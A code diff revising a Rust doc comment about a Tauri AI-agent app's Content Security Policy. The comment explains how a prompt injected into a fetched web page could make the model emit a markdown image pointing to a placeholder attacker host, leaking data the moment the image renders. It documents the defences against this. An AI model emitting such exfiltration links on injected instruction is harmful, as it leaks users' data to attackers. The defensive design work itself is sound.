@@ -1,5 +1,5 @@
 // ── surface: backend ──────────────────────────────────
-// Crate root — module wiring + Tauri setup (incl. the CSP essay: img-src-only by design).
+// Crate root — module wiring + Tauri setup (incl. the CSP rationale: why img-src is spelled out).
 // Exports: run · Related: main.rs, commands.rs
 
 mod agent;
@@ -36,20 +36,24 @@ use tools::fetch::{FetchProvider, TavilyExtract};
 use tools::search::{SearchProvider, TavilySearch};
 use tools::Tools;
 
-/// **On the CSP in `tauri.conf.json`.** It constrains `img-src` and nothing else,
-/// on purpose. Directives left unset stay unrestricted, so it cannot break
-/// scripts, styles, fonts or IPC — it exists solely to stop the webview
-/// auto-fetching a remote image. That is a zero-click exfiltration channel once a
-/// model chooses the URL: an `<img>` issues its GET on render, so a prompt
-/// injected into a page returned by `web_fetch` can have the model emit
-/// `![](https://attacker/p.png?d=…)` and the request leaves as the token streams.
-/// The `img` override in `App.tsx` is the primary defence; this is the backstop
-/// for anything that bypasses it.
+/// **On the CSP in `tauri.conf.json`.** A full `default-src 'self'` policy, not the
+/// img-src-only one this comment described before 2026-10-06 — so the old reasoning
+/// that "unset directives stay unrestricted" no longer applies, and the config, not
+/// this comment, is the source of truth.
 ///
-/// A full `default-src` policy is worth having, but it has to be verified against
-/// a running build (Tauri's IPC needs `ipc:`/`http://ipc.localhost` in
-/// `connect-src`, and KaTeX needs inline styles) — a wrong one white-screens the
-/// app on launch, which is not a thing to discover after shipping.
+/// `img-src` is still spelled out explicitly, and that is the reason a CSP is here at
+/// all: an `<img>` issues its GET on render, so a prompt injected into a page
+/// returned by `web_fetch` can make the model emit `![](https://attacker/p.png?d=…)`
+/// and the request leaves as the token streams. The `img` override in `App.tsx` is
+/// the primary defence; this is the backstop for anything that bypasses it.
+///
+/// It is NOT a tight policy: `script-src` and `style-src` both allow `'unsafe-inline'`
+/// — the latter is load-bearing (KaTeX emits inline styles, and every React
+/// `style={{…}}` prop becomes a style attribute) — and `connect-src` opens
+/// `ws://localhost:1420` for the dev server. Each of those is a real loosening —
+/// verify it against a running build before narrowing it. Tauri's IPC needs
+/// `ipc:`/`http://ipc.localhost` in `connect-src`, and a wrong policy white-screens
+/// the app on launch, which is not a thing to discover after shipping.
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     // Load src-tauri/.env (e.g. TAVILY_API_KEY, OUTPOST_TIMEZONE) for local
